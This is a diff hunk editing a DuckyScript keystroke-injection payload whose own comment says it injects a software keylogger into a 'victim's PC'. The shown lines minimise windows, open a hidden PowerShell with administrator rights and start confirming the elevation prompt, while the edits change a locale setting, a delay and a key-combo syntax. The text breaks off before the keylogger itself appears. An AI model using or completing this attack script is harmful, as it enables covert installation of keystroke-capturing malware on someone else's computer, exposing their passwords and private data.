@@ -1,15 +1,14 @@
 REM This script allows you to inject a software keylogger in victim's PC
-LOCALE FR
 DELAY 2500
 REM Minimize all app
 GUI d
 DELAY 500
 REM Start powershell as admin
 GUI r
-DELAY 500
+DELAY 1000
 STRING powershell.exe -windowstyle hidden
 DELAY 200
-CTRL SHIFT ENTER
+CTRL-SHIFT ENTER
 DELAY 2000
 LEFT
 DELAY 150
